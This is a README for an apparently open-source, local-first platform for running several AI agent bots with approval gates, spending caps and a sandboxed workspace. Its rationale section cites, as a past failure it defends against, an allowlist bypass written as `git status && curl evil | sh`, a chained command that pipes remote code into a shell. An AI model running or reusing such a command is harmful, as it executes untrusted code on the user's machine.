# hutch

> Your bots. Your machine. Your rules.

hutch is a **local-first, open-source multi-bot agent platform**. Run multiple named AI bots on
your own machine — each with its own model, tools, schedule, memory, and sandboxed workspace —
with human approval gates, hard spending caps, and complete run transcripts.

Cloud agent platforms rent you a black box with usage limits. hutch inverts that: the
orchestrator, memory, logs, and bots live in one directory on your disk, with any model — local
(Ollama, llama.cpp, LM Studio) or hosted (OpenAI and any OpenAI-compatible API).

```
$ hutch run tidy-downloads "sort this week's downloads"
→ remember    {"key": "last-run", "value": "sort downloads"}
→ list_files  42 files
⏳ approval needed: move invoices/ → sorted/invoices/      ← you decide
✓ approved — continuing
✓ moved 38 files · run succeeded (steps=6, tokens≈2.1k)
```

## Why it exists

Every core requirement traces to a **documented failure** of existing agent products — the $447
silent runaway bill, schedules that quietly never ran, agents that read `~/.ssh`, allowlists
bypassed with `git status && curl evil | sh`, permission prompts so relentless people switch to
yolo mode. The receipts and the requirement traceability live in
[docs/research/complaints.md](docs/research/complaints.md); the design answers are in
[docs/safety.md](docs/safety.md).

## Quickstart

```bash
git clone https://github.com/kevinarthur/hutch && cd hutch
pip install -e .               # or: uv venv && uv pip install -e ".[dev]"
hutch init                   # state dir + 3 starter bots (free mock model — no API key)
hutch serve                  # dashboard → http://127.0.0.1:8787
```

Your first run will pause for a human decision — that's the point:

```bash
$ hutch run research-briefing "summarize this week's AI news"
⏳ approval needed: write report.md (281 chars)
   resolve with: hutch approvals approve apr_…  (or --always to remember)
$ hutch approvals approve apr_… --always
✓ run succeeded (steps=4, tokens≈1.4k)
```

Then point a bot at a real model:

```bash
hutch bot update research-briefing --model ollama/llama3.2     # or openai/gpt-4o-mini
hutch daemon                 # headless: schedules, dispatch, approval expiry
```

## Feature highlights

- **Multiple named bots** — own model, tools, schedule, memory, workspace; pause/resume; templates
- **Any model, local first** — OpenAI-compatible client with provider presets; free offline mock runtime
- **Scheduling that survives real life** — IANA-timezone cron, DST-correct, catch-up after sleep,
  never overlapping runs
- **Approvals that don't nag** — ask-once with sticky always-allows; unanswered = denied
- **Hard caps** — steps, wall-clock, daily tokens per bot
- **Workspace jail** — path-jailed file ops; shells run with redirected HOME; secrets denied by class
- **Full transcripts** — every run in SQLite + append-only JSONL on disk
- **Browser with memory** — persistent per-bot Chromium profiles; pauses for humans at CAPTCHA/MFA
- **Pluggable runtimes** — built-in loop (default), or delegate a bot to [Pi](https://pi.dev) / [OpenCode](https://opencode.ai)

## Documentation

| Doc | Contents |
|---|---|
| [Architecture](docs/architecture.md) | component map, decision log, concurrency model |
| [Safety model](docs/safety.md) | deny/ask/allow rules, approval flow, honest limits |
| [Bot configuration](docs/bot-config.md) | fields, model specs, schedules, limits, examples |
| [Roadmap](docs/roadmap.md) | phases: hardening → capability → scale-out |
| [Research](docs/research/) | orchestrator/runtime comparison; incident-based requirements |

Marketing site: [website/](website/index.html) (static, no build step).

## Development

```bash
uv venv && uv pip install -e ".[dev]"
pytest                # 70 tests, fully offline (mock runtime)
hutch demo seed && hutch serve   # rich dashboard state for manual testing
```

Python ≥ 3.11. Linux first; macOS/Windows are roadmap items.

## License

MIT — see [LICENSE](LICENSE).
